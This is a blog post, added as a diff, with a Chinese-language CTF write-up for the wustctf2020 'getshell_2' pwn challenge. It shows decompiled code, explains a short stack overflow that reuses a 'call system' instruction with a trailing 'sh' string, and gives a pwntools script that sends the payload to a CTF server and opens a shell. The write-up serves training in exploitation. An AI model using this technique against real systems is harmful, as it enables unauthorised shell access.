@@ -1,0 +1,57 @@
+---
+layout: post
+title:  getshell_2(wustctf2020)
+date:   2022-09-21 00:08:01 +0300
+image:  2022-09-21-cat.jpg
+tags:   [ctf,pwn,ubuntu16,stackoverflow,ret2text]
+---
+
+main
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init();
+  vulnerable();
+  return 0;
+}
+```
+
+vulnerable
+
+```assembly
+ssize_t vulnerable()
+{
+  char buf[24]; // [esp+0h] [ebp-18h] BYREF
+
+  return read(0, buf, 0x24u);
+}
+```
+
+但是没法利用`system@plt`地址，因为plt地址需要返回值，可溢出的地址位数不够`0x24-0x18=0xc`，所以只能用`shell()`里的`call system`来调用system，call函数不用返回值了，它会自己把下一条指令给压进去
+
+```assembly
+int shell()
+{
+  return system("/bbbbbbbbin_what_the_f?ck__--??/sh");
+}
+```
+
+虽然没有给`/bin/sh`，但是这串字符串的最后`sh`可以用作参数，同样可以获取到shell。
+
+```assembly
+from pwn import *
+
+io = remote("node4.buuoj.cn", 29546)
+
+sh = 0x08048670
+call_system = 0x08048529
+
+#attack
+payload = b'M'*(0x18+4) + p32(call_system) + p32(sh)
+io.recv()
+io.sendline(payload)
+
+io.interactive()
+```
+
